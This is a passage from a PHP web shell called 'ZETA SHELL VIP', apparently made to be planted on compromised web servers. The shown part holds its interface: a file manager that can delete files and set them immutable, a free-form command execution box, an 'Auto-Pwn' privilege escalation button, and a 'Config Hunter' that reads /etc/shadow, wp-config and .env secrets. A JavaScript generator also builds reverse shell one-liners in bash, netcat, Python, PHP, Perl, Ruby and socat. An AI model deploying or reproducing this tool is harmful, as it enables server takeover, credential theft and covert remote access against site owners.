                foreach ($folders as $folder) { $folder_path = PATH . "/" . $folder; $perms = @fileperms($folder_path); $perms_str = ($perms === false) ? '????' : substr(sprintf('%o', $perms), -4); $mtime = @filemtime($folder_path); $mtime_str = ($mtime === false) ? '???' : date("Y-m-d H:i:s", $mtime); $perms_readable = perms_to_string($perms); $file_encoded = urlencode($folder); $path_encoded_url = urlencode(encodePath(PATH)); echo "<tr><td>" . fileIcon($folder) . "<a href='?p=" . urlencode(encodePath($folder_path)) . "'>" . htmlspecialchars($folder) . "</a></td><td><b>[DIR]</b></td><td>" . $mtime_str . "</td><td><span class='perms' title='" . $perms_readable . "'>" . $perms_str . "</span></td><td><a title='Edit' href='#' onclick='alert(\"Klasör!\"); return false;'><i class='fas fa-file-pen' style='opacity:0.3;'></i></a> <a title='Rename' href='?r=1&file=" . $file_encoded . "&p=" . $path_encoded_url . "'><i class='fas fa-edit'></i></a> <a title='Delete' href='?d=1&file=" . $file_encoded . "&p=" . $path_encoded_url . "' onclick='return confirm(\"Sil?\");'><i class='fas fa-trash'></i></a> <a title='Download' href='#' onclick='alert(\"Klasör!\"); return false;'><i class='fas fa-download' style='opacity:0.3;'></i></a> | <a title='Lock (0444)' href='?chmod=0444&file=" . $file_encoded . "&p=" . $path_encoded_url . "'><i class='fas fa-lock hacker-icon-lock'></i></a> <a title='Unlock (0755)' href='?chmod=0755&file=" . $file_encoded . "&p=" . $path_encoded_url . "'><i class='fas fa-unlock hacker-icon-lock'></i></a> | <a title='IMMUTABLE (+i)' href='?chattr=lock&file=" . $file_encoded . "&p=" . $path_encoded_url . "' onclick='return confirm(\"chattr +i?\");'><i class='fas fa-anchor hacker-icon-anchor'></i></a> <a title='Mutable (-i)' href='?chattr=unlock&file=" . $file_encoded . "&p=" . $path_encoded_url . "' onclick='return confirm(\"chattr -i?\");'><i class='fas fa-unlink hacker-icon-anchor'></i></a></td></tr>"; }
                foreach ($files as $file) { $file_path = PATH . "/" . $file; $perms = @fileperms($file_path); $perms_str = ($perms === false) ? '????' : substr(sprintf('%o', $perms), -4); $size = @filesize($file_path); $size_str = ($size === false) ? '???' : formatSizeUnits($size); $mtime = @filemtime($file_path); $mtime_str = ($mtime === false) ? '???' : date("Y-m-d H:i:s", $mtime); $perms_readable = perms_to_string($perms); $file_encoded = urlencode($file); $path_encoded_url = urlencode(encodePath(PATH)); echo "<tr><td>" . fileIcon($file) . htmlspecialchars($file) . "</td><td>" . $size_str . "</td><td>" . $mtime_str . "</td><td><span class='perms' title='" . $perms_readable . "'>" . $perms_str . "</span></td><td><a title='Edit' href='?e=1&file=" . $file_encoded . "&p=" . $path_encoded_url . "'><i class='fas fa-file-pen'></i></a> <a title='Rename' href='?r=1&file=" . $file_encoded . "&p=" . $path_encoded_url . "'><i class='fas fa-edit'></i></a> <a title='Delete' href='?d=1&file=" . $file_encoded . "&p=" . $path_encoded_url . "' onclick='return confirm(\"Sil?\");'><i class='fas fa-trash'></i></a> <a title='Download' href='?dl=1&file=" . $file_encoded . "&p=" . $path_encoded_url . "'><i class='fas fa-download'></i></a> | <a title='Lock (0444)' href='?chmod=0444&file=" . $file_encoded . "&p=" . $path_encoded_url . "'><i class='fas fa-lock hacker-icon-lock'></i></a> <a title='Unlock (0644)' href='?chmod=0644&file=" . $file_encoded . "&p=" . $path_encoded_url . "'><i class='fas fa-unlock hacker-icon-lock'></i></a> | <a title='IMMUTABLE (+i)' href='?chattr=lock&file=" . $file_encoded . "&p=" . $path_encoded_url . "' onclick='return confirm(\"chattr +i?\");'><i class='fas fa-anchor hacker-icon-anchor'></i></a> <a title='Mutable (-i)' href='?chattr=unlock&file=" . $file_encoded . "&p=" . $path_encoded_url . "' onclick='return confirm(\"chattr -i?\");'><i class='fas fa-unlink hacker-icon-anchor'></i></a></td></tr>"; }
                echo "</tbody></table>";
            }
        }
        ?>

        <!-- Komut Çalıştırma -->
        <div class="command-section">
             <h3><i class="fas fa-terminal"></i> Execute Command</h3>
             <div class="quick-cmd-buttons">
                 <button class="quick-cmd-btn" onclick="setCmd('whoami')">whoami</button>
                 <button class="quick-cmd-btn" onclick="setCmd('id')">id</button>
                 <button class="quick-cmd-btn" onclick="setCmd('uname -a')">uname -a</button>
                 <button class="quick-cmd-btn" onclick="setCmd('ps aux')">ps aux</button>
                 <button class="quick-cmd-btn" onclick="setCmd('netstat -tulnp')">netstat</button>
             </div>
             <form method="post" action="?p=<?php echo urlencode(encodePath(PATH)); ?>" class="command-form">
                 <input type="text" id="command_input" name="command" placeholder="Enter command..." value="<?php echo isset($_POST['command']) ? htmlspecialchars($_POST['command']) : ''; ?>" required>
                 <button type="submit" name="run_command" class="action-btn">Run!</button>
             </form>
             <?php if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['run_command'])): ?>
                 <h4>Output:</h4>
                 <pre class="command-output"><?php echo $action_result_output; ?></pre>
             <?php endif; ?>
        </div>

         <!-- Açılır/Kapanır Bölümler -->
        <details class="collapsible-section" <?php echo ($_SERVER['REQUEST_METHOD'] === 'POST' && (isset($_POST['analyze_system']) || isset($_POST['attempt_autopwn']))) ? 'open' : ''; // Analiz yapıldıysa açık gelsin ?>>
            <summary><i class="fas fa-shield-alt"></i> System Info & Exploit Helper</summary>
            <div>
                <form method="post" action="?p=<?php echo urlencode(encodePath(PATH)); ?>" style="display:inline-block;"> <button type="submit" name="analyze_system" class="action-btn">Analyze System</button> </form>
                <form method="post" action="?p=<?php echo urlencode(encodePath(PATH)); ?>" style="display:inline-block;"> <button type="submit" name="attempt_autopwn" class="action-btn" style="background:#f0ad4e;color:#000;" onclick="return confirm('Auto-Pwn?')">Try Auto-Pwn!</button> </form>
                <?php if (($_SERVER['REQUEST_METHOD'] === 'POST' && (isset($_POST['analyze_system']) || isset($_POST['attempt_autopwn'])))): ?>
                     <h4>Analysis / Attempt Result:</h4>
                     <pre class="info-output"><?php echo $action_result_output; ?></pre>
                     <p> <a href="https://www.exploit-db.com/" target="_blank" class="action-btn">Search Exploit-DB</a> <a href="https://gtfobins.github.io/" target="_blank" class="action-btn">Check GTFOBins</a> </p>
                 <?php endif; ?>
            </div>
        </details>

        <details class="collapsible-section"> <summary><i class="fas fa-satellite-dish"></i> Reverse Shell Helper</summary> <div> <form method="post" onsubmit="generateShell(event)"> Your IP: <input type="text" id="rev_ip" value="<?php echo htmlspecialchars($_SERVER['REMOTE_ADDR']); ?>" style="width:150px; display:inline-block; margin-right:10px;"> Port: <input type="text" id="rev_port" value="4444" style="width:80px; display:inline-block; margin-right:10px;"> Type: <select id="shell_type" style="background:var(--code-bg); color:var(--text-color); border:1px solid var(--border-color); padding: 4px;"> <option value="bash_tcp">Bash TCP</option> <option value="nc_e">Netcat -e</option> <option value="nc_mkfifo">Netcat mkfifo</option> <option value="python3">Python3</option> <option value="php">PHP</option> <option value="perl">Perl</option> <option value="ruby">Ruby</option> <option value="socat">Socat</option> </select> <button type="submit" class="action-btn">Generate!</button> </form> <pre id="generated_shell_output" class="command-output" style="margin-top:10px; display:none;"></pre> </div> </details>

        <details class="collapsible-section" <?php echo ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['read_config'])) ? 'open' : ''; ?>>
             <summary><i class="fas fa-key"></i> Config Hunter</summary>
             <div> <p>Attempt to read common configuration files:</p> <div class="quick-cmd-buttons"> <a href="?read_config=passwd&p=<?php echo urlencode(encodePath(PATH)); ?>"><button class="config-btn">/etc/passwd</button></a> <a href="?read_config=shadow&p=<?php echo urlencode(encodePath(PATH)); ?>"><button class="config-btn" style="background:#f0ad4e;color:#000;">/etc/shadow</button></a> <a href="?read_config=wpconfig&p=<?php echo urlencode(encodePath(PATH)); ?>"><button class="config-btn">wp-config (here)</button></a> <a href="?read_config=wpconfig_up&p=<?php echo urlencode(encodePath(PATH)); ?>"><button class="config-btn">wp-config (up)</button></a> <a href="?read_config=env&p=<?php echo urlencode(encodePath(PATH)); ?>"><button class="config-btn">.env (here)</button></a> <a href="?read_config=env_up&p=<?php echo urlencode(encodePath(PATH)); ?>"><button class="config-btn">.env (up)</button></a> <a href="?read_config=apache_conf&p=<?php echo urlencode(encodePath(PATH)); ?>"><button class="config-btn">apache2.conf</button></a> <a href="?read_config=nginx_conf&p=<?php echo urlencode(encodePath(PATH)); ?>"><button class="config-btn">nginx.conf</button></a> <a href="?read_config=php_ini&p=<?php echo urlencode(encodePath(PATH)); ?>"><button class="config-btn">php.ini</button></a> </div>
                  <?php if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['read_config'])): ?> <h4>Config Content:</h4> <pre class="info-output"><?php echo $action_result_output; ?></pre> <?php endif; ?>
             </div>
         </details>

        <!-- Footer -->
        <div class="hacker-footer"> <p>~~ ZETA SHELL VİP <?php echo $SHELL_VERSION; ?> coded by <span style="color:var(--header-color); font-weight:bold;">berofc</span> ~~</p> <p> <a href="https://instagram.com/Berofc" target="_blank"><i class="fab fa-instagram"></i> Instagram: Berofc</a> </p> </div>

    </div> <!-- container-fluid sonu -->
    <script>
        // --- Shell JavaScript ---
        var typed = new Typed('#shell-title', { strings: ['ZETA SHELL VIP <?php echo $SHELL_VERSION; ?>', 'SYSTEM_BREACHED_ALPHA', 'BEROFC_ONLINE', 'AWAITING_KAOS...^1000'], typeSpeed: 40, backSpeed: 25, loop: true, showCursor: true, cursorChar: '█', smartBackspace: true });
        function perms_to_string_js(permsOctalStr) { /* ... JS perms kodu ... */ if (!permsOctalStr || permsOctalStr === '????') return 'Unknown'; const perms = parseInt(permsOctalStr, 8); if (isNaN(perms)) return 'Invalid'; let info = ''; if ((perms & 0xC000) === 0xC000) { info = 's'; } else if ((perms & 0xA000) === 0xA000) { info = 'l'; } else if ((perms & 0x8000) === 0x8000) { info = '-'; } else if ((perms & 0x6000) === 0x6000) { info = 'b'; } else if ((perms & 0x4000) === 0x4000) { info = 'd'; } else if ((perms & 0x2000) === 0x2000) { info = 'c'; } else if ((perms & 0x1000) === 0x1000) { info = 'p'; } else { info = 'u'; } info += ((perms & 0x0100) ? 'r' : '-'); info += ((perms & 0x0080) ? 'w' : '-'); info += ((perms & 0x0040) ? ((perms & 0x0800) ? 's' : 'x' ) : ((perms & 0x0800) ? 'S' : '-')); info += ((perms & 0x0020) ? 'r' : '-'); info += ((perms & 0x0010) ? 'w' : '-'); info += ((perms & 0x0008) ? ((perms & 0x0400) ? 's' : 'x' ) : ((perms & 0x0400) ? 'S' : '-')); info += ((perms & 0x0004) ? 'r' : '-'); info += ((perms & 0x0002) ? 'w' : '-'); info += ((perms & 0x0001) ? ((perms & 0x0200) ? 't' : 'x' ) : ((perms & 0x0200) ? 'T' : '-')); return info; }
        document.querySelectorAll('.perms').forEach(el => { el.title = perms_to_string_js(el.textContent); });
        function setCmd(cmd) { document.getElementById('command_input').value = cmd; }
        function generateShell(event) { /* ... Reverse Shell JS Kodu ... */ event.preventDefault(); const ip = document.getElementById('rev_ip').value; const port = document.getElementById('rev_port').value; const type = document.getElementById('shell_type').value; let command = ''; if (!ip || !port) { alert('IP ve Port gir!'); return; } switch(type) { case 'bash_tcp': command = `bash -i >& /dev/tcp/${ip}/${port} 0>&1`; break; case 'nc_e': command = `nc -e /bin/bash ${ip} ${port}`; break; case 'nc_mkfifo': command = `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ${ip} ${port} >/tmp/f`; break; case 'python3': command = `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'`; break; case 'php': command = `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/bash -i <&3 >&3 2>&3");'`; break; case 'perl': command = `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'`; break; case 'ruby': command = `ruby -rsocket -e'f=TCPSocket.open("${ip}",${port}).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)'`; break; case 'socat': command = `socat tcp-connect:${ip}:${port} exec:/bin/bash,pty,stderr,setsid,sigint,sane`; break; default: command = 'Unknown type'; } const outputArea = document.getElementById('generated_shell_output'); outputArea.textContent = command; outputArea.style.display = 'block'; const selection = window.getSelection(); const range = document.createRange(); range.selectNodeContents(outputArea); selection.removeAllRanges(); selection.addRange(range); try { document.execCommand('copy'); alert('Komut kopyalandı!'); } catch (err) { alert('Manuel kopyala!'); } }
        // URL'den gelen mesajı göster
         document.addEventListener('DOMContentLoaded', function() { const urlParams = new URLSearchParams(window.location.search); const msg = urlParams.get('msg'); const msgType = urlParams.get('msg_type'); if (msg) { const msgDiv = document.createElement('div'); msgDiv.className = 'message ' + (msgType || 'info'); msgDiv.innerHTML = '<i class="fas fa-info-circle"></i> ' + decodeURIComponent(msg.replace(/\+/g, ' ')); document.querySelector('.breadcrumb').insertAdjacentElement('afterend', msgDiv); setTimeout(() => { if(msgDiv) msgDiv.style.display='none'; }, 4000); const currentUrl = new URL(window.location); currentUrl.searchParams.delete('msg'); currentUrl.searchParams.delete('msg_type'); history.replaceState(null, '', currentUrl.toString()); } });
    </script>
</body>
</html>
